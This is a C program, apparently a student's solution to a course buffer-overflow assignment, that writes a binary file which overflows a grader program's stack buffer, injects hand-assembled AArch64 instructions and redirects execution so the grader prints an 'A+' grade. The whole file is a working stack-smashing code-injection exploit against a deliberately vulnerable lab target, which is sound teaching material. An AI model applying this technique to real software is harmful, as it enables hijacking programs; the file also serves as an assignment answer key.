/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Emily Qian, Claire Shin                                    */
/*--------------------------------------------------------------------*/

/*
 * Purpose: Produces a file named "dataAplus" that manipulates the grader
 * program's behavior to produce an A+ grade. This is achieved by crafting
 * assembly instructions to write 'A+' into the output.
 */

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/*
 * Main function: Writes a crafted payload to a file "dataAplus" that:
 * - Contains a student name.
 * - Includes padding to overflow the stack.
 * - Injects assembly instructions to modify the grader's behavior.
 * Accepts no input arguments and interacts solely via the output file.
 */
int main(void) {
    char* name = "Shin Qian";
    int i;
    unsigned long instructionAddress;
    unsigned int movInstruction, adrInstruction, strbInstruction, branchInstruction;

    /* Open the file "dataAplus" for binary writing */
    FILE *psFile = fopen("dataAplus", "wb");
    if (psFile == NULL) {
        perror("Error opening file");
        return 1; /* Exit with error if file can't be opened */
    }

    /* Step 1: Write the student name and null terminator */
    fwrite(name, 1, 9, psFile); /* Name length = 9, excludes null terminator */
    fputc('\0', psFile);

    /* Step 2: Add padding to overflow the buffer */
    for (i = 0; i < 10; i++) {
        fputc(0x00, psFile);
    }

    /* Step 3: Write the 'A' character for output */
    fputc('A', psFile);

    /* Step 4: Add null bytes for string termination and alignment */
    for (i = 0; i < 3; i++) {
        fputc(0x00, psFile);
    }

    /* Step 5: Add instructions to print 'A' and overwrite 'D' with '+' */
    movInstruction = MiniAssembler_adr(0, 0x42006C, 0x420070); /* Move address for 'A' */
    fwrite(&movInstruction, sizeof(unsigned int), 1, psFile);

    branchInstruction = MiniAssembler_bl(0x400690, 0x420074); /* Branch to printf */
    fwrite(&branchInstruction, sizeof(unsigned int), 1, psFile);

    /* Replace 'D' with '+' for final output */
    movInstruction = MiniAssembler_mov(0, '+'); /* Move '+' into register */
    fwrite(&movInstruction, sizeof(unsigned int), 1, psFile);

    adrInstruction = MiniAssembler_adr(1, 0x420044, 0x42007C); /* Address of 'D' */
    fwrite(&adrInstruction, sizeof(unsigned int), 1, psFile);

    strbInstruction = MiniAssembler_strb(0, 1); /* Store '+' at address */
    fwrite(&strbInstruction, sizeof(unsigned int), 1, psFile);

    branchInstruction = MiniAssembler_b(0x40089C, 0x420084); /* Branch back */
    fwrite(&branchInstruction, sizeof(unsigned int), 1, psFile);

    /* Step 6: Write the address of the crafted instructions in memory */
    instructionAddress = 0x420070; /* Starting address of payload */
    fwrite(&instructionAddress, sizeof(unsigned long), 1, psFile);

    /* Close the file and return success */
    fclose(psFile);
    return 0;
}